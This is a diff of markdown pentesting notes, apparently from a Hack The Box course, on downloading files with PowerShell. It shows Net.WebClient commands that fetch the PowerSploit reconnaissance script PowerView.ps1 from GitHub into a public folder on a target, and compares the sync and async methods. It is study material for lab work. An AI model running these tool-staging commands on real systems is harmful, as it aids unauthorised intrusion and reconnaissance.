@@ -67,16 +67,12 @@ PowerShell offers many file transfer options. In any version of PowerShell, the�
 
 Let's explore some examples of those methods for downloading files using PowerShell.
 
+
 #### PowerShell DownloadFile Method
 
 We can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.
 
 #### File Download
-
-        powershell
-`PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>') 
-PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1') PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>') 
-PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')`
 
 ```Powershell
 PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>') 
@@ -84,7 +80,11 @@ PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubuserconten
 PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>') PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
 ```
 
-#### Which is used in penetration testing?
+
+
+ #### Which is used in penetration testing?
+
+
 
 - **`DownloadFile()`**
     - Simpler.
@@ -94,4 +94,6 @@ PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File
     - Useful if the download is large or slow.
     - Lets you continue executing other commands while the file downloads.
     - Can make long-running downloads less disruptive.
-- 
+
+
+### df
